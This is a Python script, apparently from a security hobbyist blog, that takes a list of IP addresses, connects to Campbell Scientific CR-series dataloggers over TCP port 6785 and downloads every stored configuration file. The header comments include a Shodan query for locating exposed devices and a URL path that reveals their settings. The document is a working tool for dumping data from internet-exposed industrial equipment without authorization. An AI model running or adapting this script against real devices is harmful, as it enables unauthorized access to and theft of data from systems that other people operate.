# https://pypi.org/project/PyCampbellCR1000/
# about PyCampbellCR1000 https://pycampbellcr1000.readthedocs.io/en/latest/
# tested on CR850 Series, CR800 Series, CR1000 Series, and can works in all others models but not tested it
# for discover settings on CR6/CR300/CR800/CR1000/CR3000 use this path /index.html?command=NewestRecord&table=Settings
# shodan: CR3000.Std OR CR1000.Std. OR CR6.Std OR CR800.Std OR CR300.Std
# 16/03/22 Carlos Antonini || hackplayers.com ||

import codecs
import sys
from pycampbellcr1000 import CR1000

ip = []
try:
	with open(sys.argv[1], 'r') as r:
		ip = r.readlines()
		for a in ip:
			try:
				device = CR1000.from_url('tcp:'+str(a.strip())+':6785')
				print("")
				print("[!] - Dump config files from datalogger for IP: "+str(a.strip()))
				print("Note: this process it may take a while, be pacient my friend! :)")
				print("")
				for i in device.list_files():
					print(codecs.decode(i))
					if codecs.decode(i) != "CPU:":
						config = str(codecs.decode(i).split(':')[1])
						with open(config, 'wb') as f:
							print("file: "+codecs.decode(i))
							f.write(device.getfile(codecs.decode(i)))
					else:
						pass
			except:
				print("")
				print("Error or TimeOut IP: "+a.strip())
				print("")
except:
	print("")
	print("[!] Filename error!!")
	print("PyCampbellDump.py <filename>")
	print("")